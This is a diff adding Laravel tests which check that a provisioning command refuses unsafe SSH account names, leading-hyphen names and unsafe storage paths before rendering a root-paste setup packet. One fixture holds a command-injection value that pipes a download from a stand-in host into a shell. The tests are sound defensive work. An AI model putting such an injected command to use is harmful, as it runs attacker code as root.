@@ -6,6 +6,7 @@ use App\Bridge\Tools\AgentNameShape;
 use App\Bridge\Tools\GitRefProbe;
 use App\Bridge\Tools\PublicKeyLineShape;
 use App\Bridge\Tools\SafePathShape;
+use App\Bridge\Tools\SshAccountShape;
 use App\Bridge\Tools\SshProbeEnvironment;
 use Illuminate\Support\Facades\Artisan;
 use Illuminate\Support\Facades\File;
@@ -566,7 +567,84 @@ class ProvisionToolsPacketTest extends TestCase
         $this->assertStringNotContainsString('BOARD-TOOLS SETUP PACKET', $out);
     }
 
-    public function test_the_php_path_and_agent_shapes_are_in_lockstep_with_the_python_owner(): void
+    public function test_a_configured_forced_command_account_outside_the_python_class_is_refused(): void
+    {
+        // ⛔ THE ACCOUNT IS NOT AN OPTION OF THIS COMMAND AND NOTHING VALIDATED IT ON THE
+        // WAY IN. It is read straight out of the agent's own YAML, and it is rendered into
+        // STEP 1's ssh target, STEP 3's `--ssh-account` and STEP 3's
+        // `sudo -u <account> python3 …` — the last of which an operator pastes at a ROOT
+        // prompt. A value carrying `;` there is a second command running as root.
+        File::put($this->dir.'/impl.yml', "identity:\n  kanban_user_id: 1\nsubscriptions: []\n"
+            ."board_tools:\n  transport: ssh\n  ssh_account: \"bridge; curl evil.example/x | sh\"\n"
+            ."  board_id: 10\n  swimlane_id: 4\n  create_stage_id: 55\n");
+
+        $exit = Artisan::call('bridge:provision-tools', ['--agent' => 'impl']);
+        $out = Artisan::output();
+
+        $this->assertSame(1, $exit);
+        $this->assertStringContainsString('the forced-command account `bridge; curl evil.example/x | sh`', $out);
+        $this->assertStringContainsString('board_tools.ssh_account in impl.yml names it', $out);
+        $this->assertStringContainsString('pastes at a ROOT prompt', $out);
+        $this->assertStringNotContainsString('BOARD-TOOLS SETUP PACKET', $out);
+    }
+
+    public function test_an_unconfigured_account_outside_the_class_blames_the_run_user_not_the_yaml(): void
+    {
+        // ⛔ THE TWO SOURCES TAKE OPPOSITE REMEDIES, so the refusal has to say which one
+        // this was. With `ssh_account` unset the value is this process's own run user —
+        // sending the operator to edit a YAML key that is not even set would be sending
+        // them to fix a file that is already correct.
+        $this->writeSshAgent(sshAccount: null);
+        $this->bindEnv(runUser: 'Bridge Box');
+
+        $exit = Artisan::call('bridge:provision-tools', ['--agent' => 'impl']);
+        $out = Artisan::output();
+
+        $this->assertSame(1, $exit);
+        $this->assertStringContainsString('the forced-command account `Bridge Box`', $out);
+        $this->assertStringContainsString("fell back to this process's own run user", $out);
+        $this->assertStringNotContainsString('names it', $out);
+        $this->assertStringNotContainsString('BOARD-TOOLS SETUP PACKET', $out);
+    }
+
+    public function test_a_storage_path_the_python_would_refuse_stops_the_packet_here(): void
+    {
+        // ⛔ `storage_path()` RELOCATES INDEPENDENTLY OF `base_path()`, so the artisan leg
+        // does not answer for it. This value is rendered into STEP 2's `mkdir -p` and
+        // `cat >` lines and into STEP 3's default `--pubkey-from` — the privileged one —
+        // so a storage/ with a space in it is a packet in which no path is safe to paste.
+        $this->writeSshAgent(sshAccount: 'bridge-user');
+        $this->app->useStoragePath($this->dir.'/storage with a space');
+
+        $exit = Artisan::call('bridge:provision-tools', ['--agent' => 'impl']);
+        $out = Artisan::output();
+
+        $this->assertSame(1, $exit);
+        $this->assertStringContainsString("this install's board-tools storage path", $out);
+        $this->assertStringContainsString('no path in this packet would be safe to paste', $out);
+        $this->assertStringNotContainsString('BOARD-TOOLS SETUP PACKET', $out);
+    }
+
+    public function test_an_ordinary_account_and_storage_path_still_render(): void
+    {
+        // ⛔ THE OTHER HALF OF THE CONTROL, as with the host forms above: a guard that
+        // refused everything would pass both refusal tests and be a defect. The account
+        // spellings a real install has — a plain name, an underscore lead, digits and a
+        // hyphen — reach the packet, and so does this install's own storage path.
+        $out = '';
+        foreach (['bridge-user', '_svc', 'bridge2'] as $account) {
+            $this->writeSshAgent(sshAccount: $account);
+            $out = $this->runPacket(['--host-a' => 'hostA.example']);
+
+            $this->assertStringContainsString("--ssh-target {$account}@hostA.example", $out, "expected {$account} to render");
+            $this->assertStringContainsString("--ssh-account {$account} ", $out);
+        }
+
+        $this->assertStringContainsString('mkdir -p '.storage_path('app/board-tools'), $out);
+        $this->assertStringContainsString('BOARD-TOOLS SETUP PACKET', $out);
+    }
+
+    public function test_the_php_path_agent_and_account_shapes_are_in_lockstep_with_the_python_owner(): void
     {
         // ⛔ ONE RULE, TWO IMPLEMENTATIONS, SO THE DRIFT IS GUARDED — the same arrangement
         // PublicKeyLineShape is under, and for the same reason: the python is what
@@ -582,14 +660,25 @@ class ProvisionToolsPacketTest extends TestCase
         $this->assertNotEmpty($agent, 'could not locate _AGENT_RE in bin/provision-board-tools.py');
         $this->assertSame($agent[1], AgentNameShape::BODY_PATTERN);
 
+        preg_match('/^_SSH_ACCOUNT_RE = re\.compile\(r"\^(.*)\$"\)$/m', $python, $account);
+        $this->assertNotEmpty($account, 'could not locate _SSH_ACCOUNT_RE in bin/provision-board-tools.py');
+        $this->assertSame($account[1], SshAccountShape::BODY_PATTERN);
+
         // ⚑ AND THE ANCHORS ARE THIS SIDE'S, NOT THE PATTERN'S. The python applies its
         // `^…$` through `fullmatch`; PHP's `$` would accept a trailing newline, so both
         // classes compose `\A…\z` around the shared body — asserted, because a newline
         // riding into a rendered command line is exactly what these shapes exist to stop.
         $this->assertFalse(SafePathShape::isSafePath("/opt/bridge/artisan\n"));
         $this->assertFalse(AgentNameShape::isAgentName("impl\n"));
+        $this->assertFalse(SshAccountShape::isAccountName("bridge\n"));
         $this->assertTrue(SafePathShape::isSafePath('/opt/bridge/artisan'));
         $this->assertTrue(AgentNameShape::isAgentName('impl'));
+        $this->assertTrue(SshAccountShape::isAccountName('bridge-user'));
+        // ⚠ AND THE LEADING CHARACTER IS PART OF THE RULE, not decoration: the python's
+        // account class refuses a name starting with a digit or a hyphen, and a value
+        // beginning `-` reaching `sudo -u <account>` would be read as an OPTION.
+        $this->assertFalse(SshAccountShape::isAccountName('-bridge'));
+        $this->assertFalse(SshAccountShape::isAccountName('2bridge'));
     }
 
     // ─── helpers ──────────────────────────────────────────────────────────────
